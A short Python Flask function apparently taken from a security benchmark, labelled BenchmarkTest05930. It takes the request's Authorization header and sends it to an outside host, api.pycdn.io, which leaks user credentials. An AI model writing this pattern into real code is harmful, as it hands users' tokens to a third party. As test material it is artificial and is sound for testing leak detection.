# SPDX-License-Identifier: Apache-2.0
import requests
from flask import request, jsonify
import urllib.request
import urllib.parse
import ssl


def BenchmarkTest05930():
    auth_header = request.headers.get('Authorization', '')
    parts = str(auth_header).split(',')
    data = ','.join(parts)
    ctx = ssl.create_default_context()
    urllib.request.urlopen('https://api.pycdn.io/data?q=' + urllib.parse.quote(str(data)), context=ctx)
    return jsonify({"result": "success"})
